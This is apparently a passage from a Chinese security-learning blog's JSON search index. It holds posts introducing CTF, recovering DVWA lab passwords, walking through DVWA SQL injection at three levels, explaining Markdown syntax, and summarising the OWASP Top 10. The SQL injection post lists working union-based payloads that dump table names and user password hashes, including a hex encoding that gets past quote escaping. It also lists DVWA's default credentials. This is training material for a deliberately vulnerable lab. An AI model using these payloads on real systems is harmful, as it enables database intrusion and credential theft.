配置\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232249.png)\n- 网络适配器的配置\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232403.png)\n\n---\n希望能给刚入门的小伙伴一点启发\n","tags":["NAT"],"categories":["实用技巧"]},{"title":"CTF介绍","url":"/2019/10/04/实用技巧/CTF介绍/","content":"刚开始接触CTF,对于misc，reverse等等都傻傻分不清，所以专门去查了下这些名词，给没有接触CTF的童鞋一点入门基础.\n\n<!-- more -->\n\n# 前言\n\n刚开始接触CTF,对于misc，reverse等等都傻傻分不清，所以专门去查了下这些名词，给没有接触CTF的童鞋一点入门基础。如果有不对的地方，欢迎大佬指点。\n\n# CTF是什么\nCTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。\nCTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。\n发展至今，已经成为全球范围网络安全圈流行的竞赛形式。\n附上参考链接：[CTF](https://baike.baidu.com/item/ctf/9548546?fr=aladdin)\n\n# CTF 介绍\n## 赛事介绍\n我们把CTF简称为夺旗赛，是因为出题的人把答案都放一个叫flag的文件下或者用flag{}形式展示给我们。一般是我们在某个站点或者某个文件下去寻找或分析得到的\n\n## 模式介绍\n  一般分为三类：`解题模式`、`攻防模式`,`混合模式`  \n1. 解题模式\n> 通过解决主办方出的题目得到相应的分数，从而获得排名。参赛有个人和团队之分。  \n赛题主要分为以下几个方向：CHOICE(比较少，适合初学者)、BASIC(这个也不多见，适合刚入门的童鞋)、WEB、REVERSE、PWN、MISC等\n以上名词等下会有介绍\n\n2. 攻防模式\n> 一般我们叫AWD,这个模式不仅看眼技术还考验手速，参赛队伍在网络空间中互相攻击和防守，挖掘漏洞并攻击对手来得分。并防御其他对手攻击自己。攻防很考验技术和应急。也考研团队的合作能力\n\n3. 混合模式\n> 将上述的两个模式结合起来。就是两个都玩，最后用分数一较高下\n一般更多的是国际赛的比赛方式\n\n## 题型介绍\n没错，这就是我刚接触最头疼的了，我内个去，这是啥啊！ 这就给你介绍介绍\n1. CHOICE:选择题包含关于信息安全的各类知识点，难度系数偏低，适合刚接触信息安全的人士来全面的了解安全行业的情况\n2. BASIC: 主要考察基础的计算机与网络安全知识，涉及信息发掘、搜索、嗅探、无线安全、正则表达式、SQL、脚本语言、汇编、C语言以及简单的破解、溢出等知识。旨在普及信息安全知识，引领信息安全爱好者入门\n3. WEB: 考察脚本注入、欺骗和跨站等脚本攻击技术\n4. REVERSE: 考察逆向破解的相关技术，要求有较高的汇编语言读写能力，以及对操作系统原理的认识\n5. PWN: 考察软件漏洞挖掘、分析及利用技术，探索二进制代码背后的秘密，要求对漏洞有一定理解，掌握操作系统原理的相关知识(自我感觉最有难度的)\n6. MOBILE: 考察移动终端安全相关知识\n7. MISC: 即杂项，考察各种计算机系统与网络安全知识，涉及隐写术、流量分析、内核安全等信息安全的各个领域。\n8. PPC:即编程类题目，题目涉及到编程算法\n9. CRYPTO:即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。\n>对AWD等不过多介绍，因为我好菜啊，还没玩过，不敢发言\n\n## 总结\n看了这么多，大家应该知道ctf是什么了吧！那么开始起航吧，之后我会一步一脚印的更新。形成一个完整的体系。\n","tags":["CTF"],"categories":["实用技巧"]},{"title":"DVWA 查看默认密码","url":"/2019/10/04/实用技巧/DVWA 如何查看登录密码并修改/","content":"如何数据库查看dvwa的密码，跳过密码验证\n\n<!-- more -->\n\n# 前言\n\n今天登录dvwa的时候发现密码错误，尝试了我自己常设置的密码后都没有结果，就决定去数据库查看dvwa的密码。话不多说，直接开始操作\n## dvwa默认密码\n如果小伙伴们只需要dvwa的默认密码去登录dvwa，这里给出dvwa的默认密码\n|\t用户名\t|\t密码\t|\n|-------------|------------|\n|\tadmin\t|\tpassword\t|\n|\tgordonb\t|\tabc123\t|\n|\t1337\t|\tcharley\t|\n|\tpablo\t|\tletmein\t|\n|\tsmithy|\tpassword\t|\n\n## 获取dvwa的密码\n1. 登录靶机，定位到dvwa的当前目录下，我的位置是`/var/www/dvwa`，这里看自己的dvwa目录在哪。\n ![dvwa目录位置](https://img-blog.csdnimg.cn/201904301206138.png)\n2. 查看dvwa的登录文件`login.php`，查看相关信息\n\t查看代码，发现密码是md5加密保存的，并且存放在数据库的users表下。![dvwa的login.php文件](https://img-blog.csdnimg.cn/20190430120820998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n3. 查看配置文件中关于数据库的相关信息，文件位于：`/var/www/dvwa/config/config.inc.php`\n\n \t![配置文件位置](https://img-blog.csdnimg.cn/20190430124811146.png)\n \t查看配置文件,发现DBMS是`mysql`，dvwa的数据库是`dvwa`,数据库的登录用户名是`root`,密码是`root`.\n ![配置文件](https://img-blog.csdnimg.cn/20190430125042833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n 4. 登录数据库查看密码\n\n\t命令：mysql -u root -p  \n    \t输入密码root,连接到数据库\n![mysql登录](https://img-blog.csdnimg.cn/20190430130748132.png)\n\n\t根据刚才的信息，我们知道数据库是dvwa，跳转到dvwa的数据库下，\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190430130852961.png)\n\n\t查找表，发现存在user表，我们查看表的信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190430130934281.png)\n\n\t查看users表，发现存在4个账户\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190430131002233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n5. 破解密码\n\t 将值放到somd5解密，发现居然是空密码，无语了。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190430131131482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n6. 修改密码\n\t如果md5解密不出来，那么我们就需要去修改密码了。\n```php\n<?php\necho md5(\"password\");\n?>\nmd5值:5f4dcc3b5aa765d61d8327deb882cf99\n>\n```\n&ensp;&ensp;&ensp;&ensp;&ensp;修改admin的密码\n```sql\nupdate set password=” 5f4dcc3b5aa765d61d8327deb882cf99” where user_id=1;\n```\n7. 登录dvwa\n使用修改后的密码登录dvwa，发现登录成功。然后你就可以开始你的靶机学习之路了。\n\n## 结语\n希望可以帮到需要的各位，学安全不易，一步一脚印，多练习，总会有收获。\n","tags":["DVWA"],"categories":["实用技巧"]},{"title":"DVWA 之SQL Injection","url":"/2019/10/04/web安全/sql注入/DVWA 之SQL Injection/","content":"\nSQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令\n\n<!-- more -->\n\n# 前言\n本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出\n>dvwa v1.0.7\n\n## 何为SQL injection\n[SQL injection](https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289?fr=aladdin) 即SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。\n\n## 手工注入思路\n虽然sqlmap好用，但还是要掌握一些手工注入的思路。下面我们了解一下非盲注的步骤\n>步骤来自FreeBuf.COM的lonehand\n1.\t判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）\n2.\t猜解SQL查询语句的字段数\n3.\t确定显示的字段顺序\n4.\t获取数据库\n5.\t获取数据库的表\n6.\t获取表中的字段名\n7.\t拿到想要的数据\n\n# DVWA sql注入进行学习\n## Low 级别\n``` php\n<?php\n\nif(isset($_GET['Submit'])){\n    // 获取输入\n\n    $id = $_GET['id'];\n\t   //执行sql命令\n    $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";\n    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );\n\t   //返回结果\n    $num = mysql_numrows($result);\n\n    $i = 0;\n\n    while ($i < $num) {\t\t\t//结果存在\n\t\t//将得到的结果保存在变量中\n        $first = mysql_result($result,$i,\"first_name\");\n        $last = mysql_result($result,$i,\"last_name\");\n        //输出到界面\n        echo '<pre>';\n        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;\n        echo '</pre>';\n\n        $i++;\n    }\n}\n?>\n```\n\n### 相关函数\n[mysql_query()](http://www.w3school.com.cn/php/func_mysql_query.asp) 函数执行一条 MySQL 查询。  \n[mysql_num_rows()](http://www.w3school.com.cn/php/func_mysql_num_rows.asp) 函数返回结果集中行的数目。  \n[mysql_result()](http://www.w3school.com.cn/php/func_mysql_result.asp) 函数返回结果集中一个字段的值。  \n\n>可以发现，没有任何的过滤和检查，可以直接构造sql 注入的命令。\n\n## Low 漏洞利用\n\n1.\t判断是否存在注入，判断注入的类型是字符型还是数字型  \n\t先输入一些内容查看结果  \n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225219381.png)  \n\t测试是否存在注入\n\t输入命令` 1 and 1=1`,返回了正确的值。  \n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225332605.png)  \n\t输入命令 `1 and 1=2`,返回了正确的值。后台数据库没有处理我们输入的值，可能不存在数字型注入  \n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225422926.png)    \n\t输入命令`1'and '1' = '2` 没有返回值，可能存在注入。\n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225441636.png)  \n\t输入命令`1’ or ‘1’ =’1` 查询成功。 不正常的结果返回，存在字符型注入  \n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225511808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n2.\t猜解SQL查询语句的字段数  \n\t使用order by 数字 从1依次递增去执行，发现命令错误时，则可以推出字段值  \n\t我们知道`1' or 1=1` 执行时会报错的，而我们需要在字段超出的时候在报错，所以先构造一个会报错的命令：例如 `1' and 1=1`，这是一个会报错的命令.  \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225625703.png)\n我们添加order by 到命令后,并注释,确保正确执行。\n`1' and 1=1 order by 1 #`    \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225659845.png)  \n输入`1' and 1=1 order by 2 #`  \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225804750.png)  \n输入`1' and 1=1 order by 3 #``  \n说明执行的sql查询语句只有两个字段，  \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225822295.png)  \n也可以使用union select 来查询字段，这样也可以获取字段\n输入`1' and 1=1 union select 1,2 #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230020712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n输入 `1' and 1=1 union select 1,2,3 #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230132800.png)  \n3.\t确定显示的字段顺序  \n如果使用order by 来获取的字段值，我们需要使用 `union select 1,2 #` 来获取字段的顺序，使用`union select` 就不需要这一步。\n输入命令： `1’ union select 1,2 #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230756923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n4.\t 获取数据库  \n输入命令：`1’ union select 1,database() #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230846528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n获取到数据库：`dvwa`\n5.\t获取数据库中的表  \n输入命令：`1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230940249.png)\n数据库中dvwa 有两个表，guestbook和users\n6.\t获取表中的字段名  \n输入命令：`1' union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users' #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502231031420.png)\nusers有5个段,`user_id,first_name,last_name,user,password,avatar`\n7.\t拿到想要的数据  \n输入命令：`1’ union select group_concat(user_id,first_name,last_name),group_concat(passwrod) from users #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019050223112869.png)\n这样就可以得到users表中的用户`user_id,first_name,last_name,password`\n\n## Medium 级别\n```php\n<?php\n\nif (isset($_GET['Submit'])) {\n\n    // Retrieve data\n\n    $id = $_GET['id'];\n    $id = mysql_real_escape_string($id);\n\n    $getid = \"SELECT first_name, last_name FROM users WHERE user_id = $id\";\n\n    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );\n\n    $num = mysql_numrows($result);\n\n    $i=0;\n\n    while ($i < $num) {\n\n        $first = mysql_result($result,$i,\"first_name\");\n        $last = mysql_result($result,$i,\"last_name\");\n\n        echo '<pre>';\n        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;\n        echo '</pre>';\n\n        $i++;\n    }\n}\n?>\n```\n>**过滤函数**：  \n[mysql_real_escape_string()](http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp) 函数转义 SQL 语句中使用的字符串中的特殊字符。\\x00 、\\n、 \\r、\\'、、\"、\\x1a，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。  \n>**相关函数**：  \n[mysql_num_rows()](http://www.w3school.com.cn/php/func_mysql_num_rows.asp) 函数返回结果集中行的数目。  \n[mysql_query()](http://www.w3school.com.cn/php/func_mysql_query.asp) 函数执行一条 MySQL 查询。  \n[mysql_result()](http://www.w3school.com.cn/php/func_mysql_result.asp) 函数返回结果集中一个字段的值。  \n\n## Medium 漏洞利用  \n听说在有版本在前端成为下拉框，这里抓包修改包，绕过就好\n\n1.\t判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）  \n输入命令：`1’ or ‘1’ =’1 #` 不是字符型注入，报错  \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502231653246.png)\n输入命令：`1 or 1=1 #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502231912434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)  \n存在数字型注入，（刚刚的过滤函数过滤了常见的字符，但是由于是数字型注入，就没有作用了，这里不会使用到引号）  \n2. 猜解SQL查询语句的字段数  \n接下来就和low级别区别不大了，我们跳过基础讲解\n输入命令：` 1 or 1=1 order by 2 #`  \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502232024370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)  \n输入命令：`输入 1 or 1=1 order by 3 #`  \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502232110632.png)  \n3.\t确定显示的字段顺序  \n输入命令：` 1 union select 1,2 #`  \n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019050223215556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n4.\t获取数据库  \n输入命令：`1 union select 1,database() #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502232304932.png)\n数据库是dvwa\n5.\t获取数据库的表  \n输入命令：` 1 union select 1,group_concat(table_name) form information_schema.tables where table_schema = database() #`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502232356592.png)\ntable 有 `guestbook` 和 `users`\n\n6. 获取表中的字段名  \n输入命令：`1 union select 1,group_concat(column_name) from information_schema.columns where table_name = ‘users’ #`\n查询失败，引号被转义了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502232540616.png)  \n这里我们采用十六进制进行绕过,users 改为 0×7573657273 成功绕过\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502232612759.png)\nusers表中有：user_id,first_name,last_name,password,avatar\n7.\t拿到想要的数据  \n输入命令：` 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502232648220.png)\n获取到users表中的所有用户的信息\n\n## High级别\n核心代码\n```php\n<?php\n\nif (isset($_GET['Submit'])) {\n\n    // Retrieve data\n\n    $id = $_GET['id'];\n    $id = stripslashes($id);\n    $id = mysql_real_escape_string($id);\n\n    if (is_numeric($id)){\n\n        $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";\n        $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );\n\n        $num = mysql_numrows($result);\n\n        $i=0;\n\n        while ($i < $num) {\n\n            $first = mysql_result($result,$i,\"first_name\");\n            $last = mysql_result($result,$i,\"last_name\");\n\n            echo '<pre>';\n            echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;\n            echo '</pre>';\n\n            $i++;\n        }\n    }\n}\n?>\n```\n>**过滤函数：**  \n[stripslashes()](http://www.w3school.com.cn/php/func_string_stripslashes.asp) 函数删除由 addslashes() 函数添加的反斜杠。\n[mysql_real_escape_string()](http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp) 函数转义 SQL 语句中使用的字符串中的特殊字符。  \n[is_numeric()](https://www.w3cschool.cn/php/php-is_numeric.html)— 检测变量是否为数字或数字字符串  \n**相关函数**  \n[mysql_num_rows()](http://www.w3school.com.cn/php/func_mysql_num_rows.asp) 函数返回结果集中行的数目。  \n[mysql_query()](http://www.w3school.com.cn/php/func_mysql_query.asp) 函数执行一条 MySQL 查询。  \n[mysql_result()](\nhttp://www.w3school.com.cn/php/func_mysql_result.asp) 函数返回结果集中一个字段的值。\n\n>大概讲一下，这个代码，判断了输入的id是否是数字类型，stripslasher()删除了addslashes()的函数添加的反斜杠，这样我就不会绕过了。查证之后，发现high级别开启了php的magic_quotes_gpc，所以这里只是告诉了我们怎么防止sql注入，能不能绕过，就看大佬们愿不愿意贡献自己的秘籍了。\n\n\n\n## 解释疑点\n为什么要加#\n>#的作用是闭合引号，注释字符,比如我们输入命令` 1’ union select 1,2 #`  这里1’会报错，是由于check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1，为了解决报错，我们需要加一个# 注释掉后面多余的引号。\n\n## 参考文章\n[新手指南：DVWA-1.9全级别教程之SQL Injection](https://www.freebuf.com/articles/web/120747.html)  \n","tags":["DVWA"],"categories":["WEB安全"]},{"title":"Markdown编辑器语法","url":"/2019/10/04/实用技巧/Markdown语法介绍/","content":"Markdown是一种轻量级标记语言,它允许人们“使用易读易写的纯文本格式编写文档，然后转换有效的XHTML或者HTML文档”，这种语言吸收了很多电子邮件中已有的纯文本标记的特性。\n\n<!-- more -->\n\n# 前言\n\n## 为什么要写博客\n* 先谈论一个话外题，为什么选择写博客，我认为写博客也是一种进步，可以温故，而在你复习的时候又会查阅一些资料，可以知新。\n\n## 为什么选择Markdown\n* 维基百科介绍:Markdown是一种轻量级标记语言,它允许人们“使用易读易写的纯文本格式编写文档，然后转换有效的XHTML或者HTML文档”，这种语言吸收了很多电子邮件中已有的纯文本标记的特性。\n* 它的优点可以概括为 ”轻量”，“易读易写”，“兼容性强”。\n\n#  Markdown语法介绍\n* 刚开始写博客，好多东西不太清楚，还望大家谅解，如果有不正确的地方还请大家不要嫌弃，欢迎指出问题，这篇文章适合新手阅读，我也是刚开始学习Markdown语法，希望之后可以互相交流。\n\n> 编写软件: Atom\n\n# 基本技巧\n>重点提示：在命令之后必须有空格，否则不识别你的命令\n## 标题\n> 在markdown中#的个数代表几级标题。  \n\n>举例\n\n```\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n##### 五级标题\n###### 六级标题\n```\n>编辑器中显示如下图\n## 引用\n>普通引用 `>`\n```\n举例：\n> 划水划水划水水\n```\n>显示为：\n> 划水划水划水水\n\n## 代码高亮\n1. 高亮某个函数名或关键字,可以使用函数\\`print \\`实现\n>输入\\`print\\`\n```\n`print`\n```\n2. 高亮某个代码片段，可以用\\`\\`\\`包裹代码，并指定一种语言\n>输入  \n> \\`\\`\\`java  \nprint(\"hello,world\");  \n\\`\\`\\`\n```java\n    print(\"hello,world\");\n```\n3. 使用4空格缩进高亮代码，效果类似于方法 2\n> 我发现自己是4个Tab或者8个空格才搞定。\n        print(\"hello,world\");\n\n## 粗体斜体\n>Markdown 的粗体和斜体使用简单的命令就可以搞定，  \n1 使用两个`**`包含文本就是粗体  \n2 使用一个`*`包含文本就是斜体  \n3 使用`***`包含文本就是粗体加斜体\n```\n输入：\n*ST0new* **ST0new**  \n*若问使君才与术*，**何如？占得人间一味愚。**\n```\n>输出  \n*ST0new* **ST0new** ***ST0new***  \n*若问使君才与术*，**何如？**?***占得人间一味愚***。\n\n## 链接\n常用链接方法\n> 1 文字连接 `[链接名称](https://链接网址)`  \n```\n举例\n输入：[ST0new的博客](https://ST0new.github.io)\n```\n>显示为：[ST0new的博客](https://ST0new.github.io)  \n\n> 2 网址链接 `<http://链接地址>`\n```\n举例\n输入：<https://ST0new.github.io>\n```\n>显示为： <https://ST0new.github.io>\n\n## 图片\n> 插入图片`![](图片链接地址)`\n\n> 将图片放在链接后面 由于两者比较相似，具有对比性\n```\n举例 放一张我们学校的美图\n输入：![](http://jjc.www.sust.edu.cn/images/17/11/18/1xz40sy10n/111044_2345.JPG)\n```\n> 显示为： ![](http://jjc.www.sust.edu.cn/images/17/11/18/1xz40sy10n/111044_2345.JPG)\n\n> 这里提示一下，图片可以是网络中的，或者是本地的，本地可以引用绝对地址和相对地址，但是都不比较保险，图片的位置变动会导致图片失效，建议大家设置图床更加保险。\n\n## 列表\n普通无序列表  `*` `+` `-`三种格式都可以\n```\n举例：\n- 样式一\n+ 样式二\n* 样式三\n```\n>显示为\n- 样式一\n+ 样式二\n* 样式三\n\n普通有序列表 用`数字`表示\n```\n举例：\n1. 样式一\n2. 样式二\n7. 样式三 #这里写一个错误的数字，仔细观察显示\n```\n>显示为\n1. 样式1\n2. 样式2\n7. 样式三\n\n>这里提示 这里有两个贴心的帮助。  \n1 它会自动为你添加数字  \n2 它会帮你修改错误的数字\n\n列表嵌套\n>1 列表的多段换行需要四个空格  \n2 列表里的引用也需要加四个空格，在`>`  \n3 列表里的代码段也是要加四个空格在按照代码语法\n\n```\n举例：\n1. A\n    - B\n        1. C\n        - 前面加四个空格\n2. 多段换行\n    - 加四个空格\n3. 列表的引用\n    四个空格\n    >前面空一行，在>之后需要四个空格\n4. 列表里的代码段\n\n    ```语言\n    前面四个空格\n``````\n\n## 换行\n如果想要另起一行，只需要在结尾加两个空格\n```\n举例：\n我想换行[空格][空格]\n我不想换行了\n```\n> 显示为：我想换行  \n我不想换行了\n\n## 分隔符\n如果你想有分割线，那么新起一行输入三个减号`---`\n```\n举例：\n---\n分割线下\n```\n---\n分割线下\n## 表格\n表格定义为 `| xx | xx | xx |`\n```\n举例：\n|  编号  |  姓名  |  技能  |    评分  |\n|:--------:|-------  |----------|---:|\n|  001  |  张三   |  写作  |  93   |\n|  002  |  李四   |  学习  |  97   |\n|  003  |  王五   |  社交  |  96   |\n|  004  | ST0new|  篮球  |  90   |\n```\n> 这里注意在列和字段之间有还有一个|---|---|---|  \n`:`的使用，只有左边为左对齐，只有右边为右对齐，两边都有为居中\n\n|  编号  |  姓名  |  技能  |    评分  |\n|:--------:|-------  |----------|---:|\n|  001  |  张三   |  写作  |  93   |\n|  002  |  李四   |  学习  |  97   |\n|  003  |  王五   |  社交  |  96   |\n|  004  | ST0new|  篮球  |  90   |\n---\n## 结语：\n- 想要熟悉Markdown的语法还需要多加练习，希望这篇文章可以帮到你，\n","tags":["语法"],"categories":["实用技巧"]},{"title":"OWASP Top 10简要介绍","url":"/2019/10/04/实用技巧/OWASP TOP 10/","content":"\n为了加深对owasp top 10 的印象 ，写一篇作为记录\n\n<!-- more -->\n\n# 前言\n\n> 最近在找实习，看到招聘全是要求熟悉**OWASP Top 10**,为了加深印象所以写一个博客记录一下 ,也希望可以为有相同需求的小伙伴提供好的资料,之后我会陆续更新相关的漏洞复现的博客，希望大家可以给我提出更好的建议。  \n>版本：[OWASP Top 10 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)\n## 什么是OWASP Top 10\n\nOWASP（开放式Web应用程序安全项目）的工具、文档、论坛和全球各地分会都是开放的，对所有致力于改进应用程序安全的人士开放，其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结了Web应用程序最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。\n\n## A1 注入injection\n> 将不安全的命令作为命令发送给解析器，会产生类似于`SQL注入、NoSQL注入、OS注入和LDAP注入`([轻量目录访问协议](https://baike.baidu.com/item/LDAP/2875565?fr=aladdin)) 的缺陷，攻击者可以构造`恶意数据`通过注入缺陷的解析器执行没有权限的`非预期命令`或`访问数据`。\n\n## A2 **失效的身份认证**\n> 通过错误使用应用程序的`身份认证`和`会话管理功能`，攻击者能够`破译密码`、`密钥`或`会话令牌`，或者`暂时`或`永久`的冒充其他用户的身份。\n\n## A3 敏感数据泄露\n> 这个比较好理解，一般我们的敏感信息包括`密码`、`财务数据`、`医疗数据`等，由于web应用或者API`未加密`或`不正确的保护敏感数据`，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。\n\n## A4外部实体(XXE)\n>XXE 全称为XML External Entity attack 即XML[(可扩展标记语言)](https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromtitle=xml&fromid=86251&fr=aladdin) 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI([统一资源标识符](https://baike.baidu.com/item/URI/16481812))文件处理器的`内部文件`和`共享文件`、`监听内部扫描端口`、`执行远程代码`和实施[拒绝服务攻击](https://baike.baidu.com/item/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/421896?fr=aladdin)。\n\n## A5失效的访问控制\n> 通过`身份验证`的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能和数据，eg:`访问用户的账户`、`敏感文件`、`获取和正常用户相同的权限`等.\n\n## A6 安全配置错误\n> 安全配置错误是比较常见的漏洞，由于操作者的`不当配置`(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。\n\n## A7 跨站脚本（xss）\n>xss攻击全称为[跨站脚本攻击](https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin),当应用程序的新网页中包含`不受信任的`、`未经恰当验证`、`转义的数据`或可以使用`HTML、JavaScript的浏览器API更新的现有网页`时，就会出现xss漏洞，跨站脚本攻击是`最普遍`的web应用安全漏洞，甚至在某些安全平台都存在xss漏洞。xss会执行攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用xss还可以执行拒绝服务攻击。\n\n## A8不安全的反序列化\n>不安全的反序列化可以导致[远程代码执行](https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2491231?fr=aladdin)、[重放攻击](https://baike.baidu.com/item/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB?fromtitle=%E9%87%8D%E6%92%AD%E6%94%BB%E5%87%BB&fromid=19455997)、注入攻击或特权升级攻击\n\n## A9使用含有已知漏洞的组件\n> [组件](https://baike.baidu.com/item/%E7%BB%84%E4%BB%B6/6902128?fr=aladdin)(eg：库、框架或其他软件模块)拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。\n\n## A10 不足的日志记录和监控\n>这个和等保有一定的关系，不作介绍，不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。\n\n---\n## 结语\n大概了解了top 